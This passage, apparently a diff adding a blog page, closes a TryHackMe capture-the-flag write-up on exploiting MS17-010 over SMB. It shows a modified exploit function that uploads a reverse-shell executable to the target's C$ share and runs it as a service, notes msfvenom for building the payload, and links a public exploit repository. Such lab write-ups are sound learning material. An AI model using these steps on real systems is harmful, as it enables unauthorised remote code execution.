+<li><code>pip2.7 install --update setuptools</code></li>
+<li><code>pip2.7 install impacket</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>If there are username, password that you can use, modify the script to enter
+them</p>
+</li>
+<li>
+<p>To launch a reverse shell (have a reverse shell ready), changing some code is required</p>
+<ul>
+<li>using <code>smb_send_file() and service_exec()</code> instead of the five lines above them</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<pre tabindex="0"><code>def smb_pwn(conn, arch): smbConn = conn.get_smbconnection()
+
+#print(&#39;creating file c:\\pwned.txt on the target&#39;) #tid2 =
+smbConn.connectTree(&#39;C$&#39;) #fid2 = smbConn.createFile(tid2, &#39;/pwned.txt&#39;)
+#smbConn.closeFile(tid2, fid2) #smbConn.disconnectTree(tid2)
+
+smb_send_file(smbConn, &#39;rev.exe&#39;, &#39;C&#39;, &#39;/rev.exe&#39;) service_exec(conn,
+r&#39;c:\rev.exe&#39;) # Note: there are many methods to get shell over SMB admin
+session # a simple method to get shell (but easily to be detected by AV) is #
+executing binary generated by &#34;msfvenom -f exe-service ...&#34;
+</code></pre><ul>
+<li>Python 3 working version of MS17-010 scripts:
+<ul>
+<li><a href="https://github.com/3ndG4me/AutoBlue-MS17-010/tree/master">https://github.com/3ndG4me/AutoBlue-MS17-010/tree/master</a></li>
+<li>Didn&rsquo;t get to work this script out</li>
+</ul>
+</li>
+</ul>
+<hr>
+<p>Overall, this challenge allowed me to learn how to use/modify the resources that
+I can find online and adjust the way they are used for my own cases. Another
+interesting challenge!</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://joonkim0625.github.io/tags/ctf/">CTF</a></li>
+      <li><a href="https://joonkim0625.github.io/tags/tryhackme/">TryHackMe</a></li>
+      <li><a href="https://joonkim0625.github.io/tags/cybersecurity/">Cybersecurity</a></li>
+      <li><a href="https://joonkim0625.github.io/tags/windows/">Windows</a></li>
+      <li><a href="https://joonkim0625.github.io/tags/smb/">SMB</a></li>
+      <li><a href="https://joonkim0625.github.io/tags/nmap/">Nmap</a></li>
+      <li><a href="https://joonkim0625.github.io/tags/ms17-010/">Ms17-010</a></li>
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="https://joonkim0625.github.io/">All Things Cyber – joonkim0625</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
